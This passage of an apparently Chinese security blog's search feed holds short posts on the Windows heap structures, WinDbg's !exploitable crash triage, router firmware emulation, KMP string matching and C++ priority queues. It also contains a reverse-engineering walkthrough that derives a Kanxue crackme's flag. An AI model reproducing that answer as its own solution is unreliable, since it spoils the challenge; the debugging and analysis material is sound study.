0x760090 ]</span><br><span class="line">   +0x098 AlignRound       : 0xf</span><br><span class="line">   +0x09c AlignMask        : 0xfffffff8</span><br><span class="line">   +0x0a0 VirtualAllocdBlocks : _LIST_ENTRY [ 0x7600a0 - 0x7600a0 ]</span><br><span class="line">   +0x0a8 SegmentList      : _LIST_ENTRY [ 0x760010 - 0x760010 ]</span><br><span class="line">   +0x0b0 AllocatorBackTraceIndex : 0</span><br><span class="line">   +0x0b4 NonDedicatedListLength : 0</span><br><span class="line">   +0x0b8 BlocksIndex      : 0x00760150 </span><br><span class="line">   +0x0bc UCRIndex         : (null) </span><br><span class="line">   +0x0c0 PseudoTagEntries : (null) </span><br><span class="line">   +0x0c4 FreeLists        : _LIST_ENTRY [ 0x760590 - 0x760590 ]</span><br><span class="line">   +0x0cc LockVariable     : 0x00760138 _HEAP_LOCK</span><br><span class="line">   +0x0d0 CommitRoutine    : 0x075c3eb7     long  +75c3eb7</span><br><span class="line">   +0x0d4 FrontEndHeap     : (null) </span><br><span class="line">   +0x0d8 FrontHeapLockCount : 0</span><br><span class="line">   +0x0da FrontEndHeapType : 0 <span class="hljs-string">&apos;&apos;</span></span><br><span class="line">   +0x0dc Counters         : _HEAP_COUNTERS</span><br><span class="line">   +0x130 TuningParameters : _HEAP_TUNING_PARAMETERS</span><br></pre></td></tr></tbody></table></figure><br>&#x53C2;&#x8003;&#xFF1A;<br><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366597(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/windows/desktop/aa366597(v=vs.85).aspx</a><br><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366599(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/windows/desktop/aa366599(v=vs.85).aspx</a><br><a href="https://searchcode.com/file/55813729/lib/rtl/heap.c" target="_blank" rel="noopener">https://searchcode.com/file/55813729/lib/rtl/heap.c</a><br>&#x8F6F;&#x4EF6;&#x8C03;&#x8BD5;(XP&#x548C;win7&#x4E0A;&#x7684;&#x533A;&#x522B;&#x9700;&#x81EA;&#x5DF1;&#x5BF9;&#x6BD4;)<p></p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆溢出(Windows)</title>
      <link href="/2017/02/24/Heap-Overflow/"/>
      <url>/2017/02/24/Heap-Overflow/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="&#x51E0;&#x4E2A;&#x6838;&#x5FC3;&#x7684;&#x51FD;&#x6570;"><a href="#&#x51E0;&#x4E2A;&#x6838;&#x5FC3;&#x7684;&#x51FD;&#x6570;" class="headerlink" title="&#x51E0;&#x4E2A;&#x6838;&#x5FC3;&#x7684;&#x51FD;&#x6570;"></a>&#x51E0;&#x4E2A;&#x6838;&#x5FC3;&#x7684;&#x51FD;&#x6570;</h2><p>HeapCreate<br></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">HANDLE WINAPI <span class="hljs-title">HeapCreate</span><span class="hljs-params">(</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">  _In_ DWORD  flOptions,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">  _In_ SIZE_T dwInitialSize,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">  _In_ SIZE_T dwMaximumSize</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>HeapAlloc<p></p></body></html>]]></content>
      
      
      <categories>
          
          <category> vuls </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vuls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整数溢出</title>
      <link href="/2017/02/24/Integer-Overflow/"/>
      <url>/2017/02/24/Integer-Overflow/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> vuls </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vuls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windbg exploitable 扩展</title>
      <link href="/2017/02/23/windbg-exploitable/"/>
      <url>/2017/02/23/windbg-exploitable/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>Windbg&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x989D;&#x5916;&#x7684;&#x6269;&#x5C55; MSEC.dll, &#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x52A0;&#x8F7D;&#x8BE5;DLL&#x6765;&#x5224;&#x65AD;&#x4E00;&#x4E2A;Crash&#x662F;&#x5426;&#x6709;&#x53EF;&#x5229;&#x7528;&#x6027;, &#x5C24;&#x5176;&#x662F;&#x5BF9;&#x4E8E;&#x7A7A;&#x6307;&#x9488;&#x7684;Crash.<br>&#x4F7F;&#x7528;&#x4E5F;&#x5F88;&#x7B80;&#x5355;, &#x9996;&#x5148;&#x4E0B;&#x8F7D;&#x540E;&#x5C06;&#x5176;&#x653E;&#x5728; Debugging Tools for Windows (x86)\winext&#x6587;&#x4EF6;&#x4E0B;.<br>&#x4F7F;&#x7528;Windbg&#x52A0;&#x8F7D;Crash<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(f34.524): Access violation - code c0000005 (!!! second chance !!!)</span><br><span class="line">eax=03f860b8 ebx=00000000 ecx=03f860b8 edx=00000000 esi=03f860b8 edi=00000000</span><br><span class="line">eip=65ac68e0 esp=03df9c30 ebp=03df9c44 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to <span class="hljs-built_in">export</span> symbols <span class="hljs-keyword">for</span> C:\Windows\system32\MSHTML.dll - </span><br><span class="line">MSHTML!CreateCoreWebView+0x9db30:</span><br><span class="line">65ac68e0 f7470800000010  <span class="hljs-built_in">test</span>    dword ptr [edi+8],10000000h ds:0023:00000008=????????</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7136;&#x540E;&#x52A0;&#x8F7D;MSEC.dll<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; !load winext\MSEC.dll</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5224;&#x65AD;&#x662F;&#x5426;&#x53EF;&#x5229;&#x7528;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; !exploitable</span><br><span class="line"></span><br><span class="line">!exploitable 1.6.0.0</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to <span class="hljs-built_in">export</span> symbols <span class="hljs-keyword">for</span> C:\Windows\System32\jscript9.dll - </span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to <span class="hljs-built_in">export</span> symbols <span class="hljs-keyword">for</span> C:\Windows\system32\msvcrt.dll - </span><br><span class="line">Exploitability Classification: PROBABLY_NOT_EXPLOITABLE</span><br><span class="line">Recommended Bug Title: Read Access Violation near NULL starting at MSHTML!CreateCoreWebView+0x000000000009db30 (Hash=0xcf51cc36.0xd0bfbfe5)</span><br><span class="line"></span><br><span class="line">This is a user mode <span class="hljs-built_in">read</span> access violation near null, and is probably not exploitable.</span><br></pre></td></tr></tbody></table></figure><br>** PROBABLY_NOT_EXPLOITABLE ** &#x8BF4;&#x660E;&#x57FA;&#x672C;&#x4E0A;&#x4E0D;&#x80FD;&#x5229;&#x7528;<p></p><p>&#x53C2;&#x8003;: <a href="https://tedazhar.wordpress.com/2011/12/27/windbg-exploitable-extension/" target="_blank" rel="noopener">https://tedazhar.wordpress.com/2011/12/27/windbg-exploitable-extension/</a></p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2012-4792 分析与利用</title>
      <link href="/2017/02/18/CVE-2012-4792/"/>
      <url>/2017/02/18/CVE-2012-4792/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> vuls </category>
          
      </categories>
      
      
        <tags>
            
            <tag> uaf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>router emulate-firmadyne</title>
      <link href="/2017/02/14/router-emulate-firmadyne/"/>
      <url>/2017/02/14/router-emulate-firmadyne/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="&#x4ECE;firmadyne&#x5B66;&#x4E60;&#x8DEF;&#x7531;&#x5668;&#x7684;&#x4EFF;&#x771F;&#x6D41;&#x7A0B;"><a href="#&#x4ECE;firmadyne&#x5B66;&#x4E60;&#x8DEF;&#x7531;&#x5668;&#x7684;&#x4EFF;&#x771F;&#x6D41;&#x7A0B;" class="headerlink" title="&#x4ECE;firmadyne&#x5B66;&#x4E60;&#x8DEF;&#x7531;&#x5668;&#x7684;&#x4EFF;&#x771F;&#x6D41;&#x7A0B;"></a>&#x4ECE;firmadyne&#x5B66;&#x4E60;&#x8DEF;&#x7531;&#x5668;&#x7684;&#x4EFF;&#x771F;&#x6D41;&#x7A0B;</h2><p>&#x4E86;&#x89E3;&#x8DEF;&#x7531;&#x5668;&#x7684;&#x4EFF;&#x771F;&#x4E3B;&#x8981;&#x662F;&#x4E86;&#x89E3;&#x8DEF;&#x7531;&#x5668;&#x662F;&#x600E;&#x4E48;&#x8FD0;&#x884C;&#x7684;&#xFF0C;&#x56FA;&#x4EF6;&#x662F;&#x4EC0;&#x4E48;&#xFF1F;&#x9700;&#x8981;&#x4EC0;&#x4E48;&#x5176;&#x4ED6;&#x7684;&#x652F;&#x6301;&#x7B49;&#x3002;</p><p>&#x7F51;&#x7EDC;&#xFF0C;NVRAM </p></body></html>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> router </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kanxue crackme 1</title>
      <link href="/2017/01/31/kanxue-1/"/>
      <url>/2017/01/31/kanxue-1/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="&#x57FA;&#x672C;&#x601D;&#x8DEF;"><a href="#&#x57FA;&#x672C;&#x601D;&#x8DEF;" class="headerlink" title="&#x57FA;&#x672C;&#x601D;&#x8DEF;"></a>&#x57FA;&#x672C;&#x601D;&#x8DEF;</h2><p>&#x6253;&#x5F00;&#x8BE5;&#x7A0B;&#x5E8F;&#x4E4B;&#x540E;&#xFF0C;&#x8F93;&#x9519;&#x4F1A;&#x51FA;&#x73B0;&#x5F02;&#x5E38;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x4F9D;&#x636E;&#x8FD9;&#x4E9B;&#x5B57;&#x7B26;&#x4E32;&#x8FFD;&#x8E2A;&#x5230;sub_402120&#x51FD;&#x6570;&#xFF0C;&#x5927;&#x81F4;&#x7406;&#x4E00;&#x4E0B;&#x8BE5;&#x9898;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x662F;&#x4E00;&#x4E2A;&#x63A5;&#x6536;&#x6D88;&#x606F;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#xFF0C;&#x5F53;&#x63A5;&#x53D7;&#x5230;&#x6D88;&#x606F;&#x65F6;&#xFF0C;&#x5C06;&#x8FDB;&#x5165;&#x8BE5;&#x51FD;&#x6570;&#x3002;<br></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)</span><br></pre></td></tr></tbody></table></figure><br>&#x5305;&#x542B;&#x56DB;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x6838;&#x5FC3;&#x7684;&#x662F;&#x5F53;wParam=1035&#x65F6;Crack&#x6210;&#x529F;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x627E;&#x5230;&#x53D1;&#x9001;&#x6D88;&#x606F;&#x5E76;&#x4E14;wParam=1035&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4F7F;&#x5F97;&#x8BE5;&#x8BED;&#x53E5;&#x80FD;&#x591F;&#x88AB;&#x6267;&#x884C;&#x3002;<br><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int16)wParam == <span class="hljs-number">1035</span> )</span><br><span class="line">    {</span><br><span class="line">      *(_OWORD *)v22 = xmmword_41DB98;</span><br><span class="line">      v25 = <span class="hljs-number">0</span>;</span><br><span class="line">      v23 = xmmword_41DBA8;</span><br><span class="line">      v24 = xmmword_41DBB8;</span><br><span class="line">      sub_4039D0(&amp;v26, <span class="hljs-number">0</span>, <span class="hljs-number">0x96</span>u);</span><br><span class="line">      MessageBoxW(hWnd, v22, <span class="hljs-string">L&quot;Successed&quot;</span>, <span class="hljs-number">0</span>);</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x6B65;&#x9AA4;"><a href="#&#x6B65;&#x9AA4;" class="headerlink" title="&#x6B65;&#x9AA4;"></a>&#x6B65;&#x9AA4;</h2><p>&#x4E00;&#x5F00;&#x59CB;&#x4EE5;&#x4E3A;&#x662F;SendMessageW&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x6D88;&#x606F;&#x7684;&#x53D1;&#x9001;&#xFF0C;&#x4F46;&#x662F;&#x67E5;&#x4E86;&#x6240;&#x6709;&#x5BF9;&#x8BE5;&#x51FD;&#x6570;&#x7684;&#x5F15;&#x7528;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x53D1;&#x9001;wParam=1035&#x7684;&#x6D88;&#x606F;&#xFF0C;&#x53D1;&#x73B0;&#x6700;&#x5F00;&#x59CB;sub_402120&#x51FD;&#x6570;&#x4F1A;&#x65B0;&#x5F00;&#x8F9F;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#xFF0C;&#x6267;&#x884C;&#x7684;&#x662F;StartAddress&#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x6B64;&#x4E00;&#x6B65;&#x4E00;&#x6B65;&#x8DDF;&#x8FDB;&#x53BB;&#x67E5;&#x770B;&#x53D1;&#x73B0;&#x5728;sub_401870&#x51FD;&#x6570;&#x4E2D;&#x4F7F;&#x7528;&#x4E86;PostMessageW&#x53D1;&#x9001;&#x4E86;1035&#x7684;&#x6D88;&#x606F;&#x3002;<br></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ( v26 == <span class="hljs-number">2</span> )                             <span class="hljs-comment">// v3 0042 0050 0035 0031</span></span><br><span class="line">    {</span><br><span class="line">      LODWORD(v35) = <span class="hljs-number">0x350031</span>;</span><br><span class="line">      HIDWORD(v35) = &amp;unk_420050;               <span class="hljs-comment">// 00420050</span></span><br><span class="line">      v28 = v3 + <span class="hljs-number">4</span>;                             <span class="hljs-comment">// &#x6BD4;&#x8F83;&#x5728;&#x8FD9; &#x63A8;&#x51FA; v3 &#x7136;&#x540E;&#x9006;&#x56DE;&#x53BB;</span></span><br><span class="line">      v36 = <span class="hljs-number">0</span>;</span><br><span class="line">      v29 = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">while</span> ( *((_WORD *)&amp;v35 + v29) == *(_WORD *)v28 )<span class="hljs-comment">// &#x6BD4;&#x8F83;&#x8FDB;&#x5165;</span></span><br><span class="line">      {</span><br><span class="line">        ++v29;</span><br><span class="line">        v28 += <span class="hljs-number">2</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v29 &gt;= <span class="hljs-number">4</span> )                         <span class="hljs-comment">// &#x56DB;&#x6B21;</span></span><br><span class="line">        {</span><br><span class="line">          <span class="hljs-keyword">if</span> ( !sub_401740(v2, v3) )            <span class="hljs-comment">// &#x8FD9;&#x91CC;&#x4E00;&#x6B21;&#x5224;&#x65AD;</span></span><br><span class="line">            <span class="hljs-keyword">break</span>;</span><br><span class="line">          v31 = <span class="hljs-number">1035</span>;</span><br><span class="line">          <span class="hljs-keyword">return</span> PostMessageW(*(HWND *)(v2 + <span class="hljs-number">4</span>), <span class="hljs-number">0x111</span>u, v31, <span class="hljs-number">0</span>);<span class="hljs-comment">// &#x6B63;&#x786E;</span></span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><br>&#x5176;&#x4E2D;v3&#x4FBF;&#x662F;&#x8F93;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5176;&#x5B9E;&#x524D;&#x9762;&#x7ECF;&#x8FC7;&#x4E24;&#x6B21;&#x76F8;&#x540C;&#x7684;&#x4EA6;&#x6216;&#xFF0C;&#x5E76;&#x5C06;&#x5C0F;&#x5199;&#x53D8;&#x4E3A;&#x4E86;&#x5927;&#x5199;&#x3002;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x8FD9;&#x91CC;&#x662F;&#x4E24;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;while&#x5224;&#x65AD;&#x7684;&#x662F;&#x7B2C;&#x4E09;&#x5230;&#x7B2C;&#x516D;&#x56DB;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x56E0;&#x6B64;&#x4F9D;&#x6B21;&#x4E3A; <strong><em>15pb</em></strong>&#x3002;&#x7531;&#x524D;&#x9762;&#x51FD;&#x6570;&#x53EF;&#x77E5;&#x4E00;&#x5171;&#x5305;&#x542B;7&#x4F4D;&#xFF0C;&#x73B0;&#x5728;&#x5DEE;&#x524D;&#x4E24;&#x4F4D;&#x548C;&#x6700;&#x540E;&#x4E00;&#x4F4D; XX15pbX&#x3002;<br>&#x8FD9;&#x91CC;sub_401740&#x51FD;&#x6570;&#x6709;&#x4E00;&#x6B21;&#x5224;&#x65AD;&#xFF0C;&#x5206;&#x6790;&#x540E;&#x8FD9;&#x91CC;&#x662F;&#x6C42;&#x51FA;&#x53E6;&#x5916;&#x4E09;&#x4F4D;&#x3002;&#x5224;&#x65AD;&#x6838;&#x5FC3;&#x5728;<br><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v14 = &amp;v20;</span><br><span class="line">v15 = <span class="hljs-string">&apos;1&apos;</span>;</span><br><span class="line"><span class="hljs-keyword">while</span> ( *(_WORD *)v14 == *(_WORD *)((<span class="hljs-keyword">char</span> *)v14 + v2 - (_DWORD)&amp;v20) )<span class="hljs-comment">// &#x524D;&#x4E24;&#x4F4D;</span></span><br><span class="line">    {</span><br><span class="line">      v15 += <span class="hljs-number">6</span>;</span><br><span class="line">      v14 = (__int128 *)((<span class="hljs-keyword">char</span> *)v14 + <span class="hljs-number">2</span>);</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v15 &gt; <span class="hljs-string">&apos;9&apos;</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">if</span> ( *(_WORD *)v2 + *((_WORD *)v8 + <span class="hljs-number">9</span>) == <span class="hljs-number">99</span> &amp;&amp; *(_WORD *)v17 == *(_DWORD *)v18 + *((_WORD *)v8 + <span class="hljs-number">6</span>) )</span><br><span class="line">          <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;                             <span class="hljs-comment">// &#x6700;&#x540E;&#x4E00;&#x4F4D;</span></span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><br>v2&#x662F;&#x4F20;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;v20&#x662F;1-9 9&#x4E2A;&#x6570;&#x5B57;&#xFF0C;&#x56E0;&#x6B64;&#x5373;&#x53EF;&#x5F97;&#x5230;&#x7B2C;&#x4E00;&#x4F4D;&#x7B2C;&#x4E8C;&#x4F4D;&#x4F9D;&#x6B21;&#x662F; 12<br>&#x6838;&#x5FC3;&#x5728;&#x4E8E; v18&#x662F;&#x5C1D;&#x8BD5;&#x7684;&#x6B21;&#x6570;&#xFF0C;v8&#x662F;&#x5C06;v20&#x548C;v2&#x4ECE;&#x7B2C;v3&#x4E2A;&#x5F00;&#x59CB;&#x4E24;&#x4E2A;&#x4E32;&#x62FC;&#x63A5;&#x590D;&#x5236;&#x8FC7;&#x53BB;&#xFF0C;&#x56E0;&#x6B64;&#x5F53;v3=1&#x65F6;&#xFF0C;v8&#x5B58;&#x653E;&#x7684;&#x662F;v20+&#x201D;215pbX&#x201D;<br><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8 = sub_4028D0((<span class="hljs-keyword">int</span>)&amp;v20, v2 + <span class="hljs-number">2</span> * *(_DWORD *)v3);<span class="hljs-comment">//v3&#x548C;v18&#x4E00;&#x6837;&#xFF0C;&#x5B58;&#x653E;&#x7684;&#x662F;&#x6B21;&#x6570;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x8FD9;&#x91CC;v17&#x662F;&#x6700;&#x540E;&#x4E00;&#x4F4D;&#xFF0C;&#x524D;&#x9762;&#x6709;&#x8D4B;&#x503C;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x4FDD;&#x8BC1;<em>(_WORD <em>)v2 + *((_WORD *)v8 + 9) == 99&#xFF0C;&#x5373;49+50&#xFF0C;&#x5373;v8+9 &#x4E3A;2&#xFF0C;&#x8868;&#x793A;v3=1&#xFF0C;&#x56E0;&#x6B64;&#x5BF9;&#x5E94;&#x540E;&#x9762;v17=1+7=8<br>&#x6240;&#x4EE5;Flag&#x4E3A; *</em></em>1215pb8***<p></p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>strstr - 字符串匹配</title>
      <link href="/2017/01/24/strstr/"/>
      <url>/2017/01/24/strstr/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x505A;&#x5B57;&#x7B26;&#x4E32;&#x5339;&#x914D;&#xFF0C;leetcode 28&#x9898;&#xFF0C;&#x5B9E;&#x73B0;strstr&#x51FD;&#x6570;&#xFF0C;&#x5728;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x53BB;&#x627E;&#x662F;&#x5426;&#x5B58;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x3002;&#x66B4;&#x529B;&#x89E3;&#xFF0C;&#x76F4;&#x63A5;&#x626B;O(n^2)&#xFF0C;C++&#x4E2D;&#x8BE5;&#x51FD;&#x6570;&#x4E5F;&#x662F;&#x8FD9;&#x4E48;&#x5B9E;&#x73B0;&#x7684;&#x3002;<br>&#x56E0;&#x4E3A;&#x5728;&#x626B;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x4F1A;&#x5B58;&#x5728;&#x4E00;&#x4E9B;&#x5DF2;&#x7ECF;&#x626B;&#x8FC7;&#x7684;&#x91CD;&#x65B0;&#x626B;&#xFF0C;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x51CF;&#x5C11;&#x590D;&#x6742;&#x5EA6;&#x5230;O(n)&#xFF0C;&#x5C31;&#x662F;KMP&#x7B97;&#x6CD5;&#x3002;</p><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h2><p><a href="http://www.cppblog.com/suiaiguo/archive/2009/07/16/90237.html" target="_blank" rel="noopener">http://www.cppblog.com/suiaiguo/archive/2009/07/16/90237.html</a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>priority queue</title>
      <link href="/2017/01/23/priority-queue/"/>
      <url>/2017/01/23/priority-queue/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>C++&#x7684;&#x4F18;&#x5148;&#x961F;&#x5217;&#x4F7F;&#x7528;</p><h2 id="&#x4F18;&#x5148;&#x961F;&#x5217;&#x7279;&#x70B9;"><a href="#&#x4F18;&#x5148;&#x961F;&#x5217;&#x7279;&#x70B9;" class="headerlink" title="&#x4F18;&#x5148;&#x961F;&#x5217;&#x7279;&#x70B9;"></a>&#x4F18;&#x5148;&#x961F;&#x5217;&#x7279;&#x70B9;</h2><p>&#x4F18;&#x5148;&#x961F;&#x5217;&#x7EF4;&#x62A4;&#x5728;&#x961F;&#x5217;&#x5934;&#x90E8;&#x7EF4;&#x6301;&#x4E00;&#x4E2A;&#x6700;&#x503C;&#xFF0C;&#x4F7F;&#x7528;&#x5806;&#x7ED3;&#x6784;&#x8FDB;&#x884C;&#x7EF4;&#x62A4;<br>&#x56E0;&#x6B64;&#x63D2;&#x5165;&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E3A;log(n)&#xFF0C;n&#x4E3A;&#x6B64;&#x65F6;&#x6811;&#x4E2D;&#x7684;&#x5143;&#x7D20;&#x4E2A;&#x6570;&#xFF0C;&#x53D6;&#x51FA;&#x6700;&#x503C;&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E3A;O(1)<br>&#x9ED8;&#x8BA4;&#x4E3A;&#x7EF4;&#x6301;&#x6700;&#x5927;&#x503C;&#xFF0C;&#x5927;&#x6839;&#x5806;<br></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;queue&gt;</span></span></span><br><span class="line">priority_queue&lt;<span class="hljs-keyword">int</span>&gt; heap ;</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x6BD4;&#x8F83;&#x51FD;&#x6570;"><a href="#&#x6BD4;&#x8F83;&#x51FD;&#x6570;" class="headerlink" title="&#x6BD4;&#x8F83;&#x51FD;&#x6570;"></a>&#x6BD4;&#x8F83;&#x51FD;&#x6570;</h2><p>&#x7EF4;&#x6301;&#x6700;&#x5C0F;&#x503C;<br></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmp</span>{</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line"><span class="hljs-keyword">return</span> a &gt; b ;</span><br><span class="line">}</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">priority_queue&lt;<span class="hljs-keyword">int</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;, cmp&gt; 